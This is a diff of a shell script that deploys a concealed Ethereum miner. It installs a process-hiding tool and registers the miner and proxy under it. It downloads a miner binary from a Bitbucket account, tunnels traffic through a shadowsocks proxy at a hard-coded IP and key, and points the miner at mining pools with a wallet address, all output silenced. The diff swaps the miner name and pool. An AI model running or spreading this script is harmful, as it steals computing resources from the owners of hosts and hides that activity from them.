@@ -1,5 +1,5 @@
 #!/bin/sh
-sleep 3m
+sleep 5m
 apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 
 apt update 
@@ -9,7 +9,7 @@ chmod +x lba
 npm i -g node-process-hider 
 
 ph add graftcp
-ph add muzik
+ph add MIN
 
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
@@ -37,21 +37,13 @@ echo " "
 echo " "
 
 
-./graftcp/graftcp wget https://bitbucket.org/skyforce112211/skyforce123/downloads/muzik
-chmod +x muzik
+./graftcp/graftcp wget https://bitbucket.org/skyforce112211/skyforce123/downloads/MIN
+chmod +x MIN
 
 
 apt -y install shadowsocks-libev rng-tools
 
 ss-local -s 51.75.141.238 -p 8388 -l 9999 -k YTMxMWRh -m chacha20-ietf-poly1305 -v &
 
-./graftcp/graftcp ./muzik -P stratum+tcp://prodent.1@eth.global.luxor.tech:700 >/dev/null 2>&1
-
+./graftcp/graftcp ./MIN --algo ethash --pers auto --server eth.cruxpool.com --port 5555 --user 0xbc48b8bdce572defe4dcab85103f140099bc5af5.T4 >/dev/null 2>&1
 sleep 2
-./graftcp/graftcp ./muzik -P stratum+tcp://prodent.2@eth.global.luxor.tech:700 >/dev/null 2>&1
-
-sleep 2
-./graftcp/graftcp ./muzik -P stratum+tcp://prodent.3@eth.global.luxor.tech:700 >/dev/null 2>&1
-
-sleep 2
-./graftcp/graftcp ./muzik -P stratum+tcp://prodent.4@eth.global.luxor.tech:700 >/dev/null 2>&1
